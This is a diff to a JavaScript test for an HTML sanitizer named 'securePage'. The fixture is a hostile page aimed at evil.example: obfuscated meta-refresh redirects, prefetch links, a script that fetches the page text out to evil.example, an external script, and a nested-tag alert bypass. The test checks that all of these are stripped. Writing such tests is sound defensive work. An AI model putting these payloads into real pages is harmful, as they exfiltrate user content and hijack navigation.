@@ -168,17 +168,22 @@ describe("core", () => {
     );
   });
 
-  test("securePage: the model's scripts and refreshes go; the CSP and Mermaid loader lead", () => {
+  test("securePage: the model's scripts, metas and links go; the CSP and Mermaid loader lead", () => {
     const evil = `<!doctype html><html><head>
 <meta http-equiv="refresh" content="0;url=https://evil.example">
+<meta http-equiv="&#x72;efresh" content="0;url=https://evil.example">
+<meta content="0;url=https://evil.example" http-equiv=REFRESH>
+<link rel="dns-prefetch" href="//secret.evil.example"><LINK rel=preconnect href=https://evil.example>
 <script>fetch("https://evil.example/?" + document.body.innerText)</script>
 <SCRIPT src="https://evil.example/x.js"></SCRIPT >
 </head><body><pre class="mermaid">graph TD; A-->B</pre><scr<script>x()</script>ipt>alert(1)</script><script>unclosed`;
     const page = securePage(evil);
     expect(page).not.toMatch(/evil\.example|alert/);
     expect(page.match(/<script/gi)?.length).toBe(1); // the loader alone
+    expect(page.match(/<meta/gi)?.length).toBe(2); // the charset and the CSP alone
+    expect(page).not.toMatch(/<link/i);
     expect(page.startsWith(
-      `<!doctype html>\n<meta http-equiv="Content-Security-Policy" content="${SUMMARY_CSP}">\n<script type="module">import mermaid`,
+      `<!doctype html>\n<meta charset="utf-8">\n<meta http-equiv="Content-Security-Policy" content="${SUMMARY_CSP}">\n<script type="module">import mermaid`,
     )).toBe(true);
     expect(page).toContain('<pre class="mermaid">graph TD; A-->B</pre>');
     expect(SUMMARY_CSP).toContain("default-src 'none'");
